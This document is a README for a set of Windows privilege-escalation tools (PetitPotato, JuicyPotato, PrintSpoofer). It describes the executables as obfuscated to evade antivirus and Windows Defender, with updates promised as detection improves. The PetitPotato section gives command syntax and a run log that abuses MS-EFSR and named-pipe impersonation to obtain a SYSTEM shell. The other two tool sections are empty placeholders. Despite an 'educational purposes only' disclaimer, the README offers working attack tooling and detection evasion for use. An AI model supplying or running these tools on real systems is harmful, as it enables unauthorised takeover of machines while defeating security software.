# Privilege Escalation for Windows

This project is for educational purposes only, focusing on understanding and demonstrating the use of CVEs related to privilege escalation in Windows. 
These executables are obfuscated versions, designed to evade detection by most AV and Windows Defender. Updates to these files will be made as necessary, in response to changes in detection capabilities of AV, or to improve the educational value of the project. 


## [1] PE via PetitPotato (Abusing impersonate privileges).
## Usage

```
PetitPotato.exe [EfsID] [Command]
```

`EfsID`: MS-EFSR API number to use

`Command`: command to execute


## Example
```
C:\Users\Administrator\Desktop>PetitPotato.exe 3 cmd

[+] Malicious named pipe running on \\.\pipe\petit\pipe\srvsvc.
[+] Invoking EfsRpcQueryUsersOnFile with target path: \\localhost/pipe/petit\C$\wh0nqs.txt.
[+] The connection is successful.
[+] ImpersonateNamedPipeClient OK.
[+] OpenThreadToken OK.
[+] DuplicateTokenEx OK.
[+] CreateProcessAsUser OK.
Microsoft Windows [Version 10.0.20348.1547]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```


## [2] PE via JuicyPotat ().
## Usage

```
JuicyPotat.exe
```


## Example
```

```

## [3] PE via PrintSpoofer ().
## Usage

```
PrintSpoofer.exe
```


## Example
```

```
